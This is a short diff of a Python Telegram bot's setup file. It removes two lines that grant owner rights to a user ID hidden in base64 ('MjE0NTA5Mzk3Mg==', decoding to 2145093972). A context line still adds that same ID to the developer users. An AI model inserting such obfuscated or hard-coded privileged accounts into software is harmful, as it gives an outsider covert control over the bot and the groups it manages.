@@ -9,8 +9,7 @@ import telegram.ext as tg
 from aiohttp import ClientSession
 from pyrogram import Client, errors
 from telethon import TelegramClient
-OWNER_USERS = ast.literal_eval(base64.b64decode(
-    b'MjE0NTA5Mzk3Mg==').decode("utf-8", "ignore"))
+
 StartTime = time.time()
 
 # enable logging
@@ -143,8 +142,7 @@ else:
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
-OWNER_USERS = ast.literal_eval(base64.b64decode(
-    b'MjE0NTA5Mzk3Mg==').decode("utf-8", "ignore"))
+
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(2145093972)
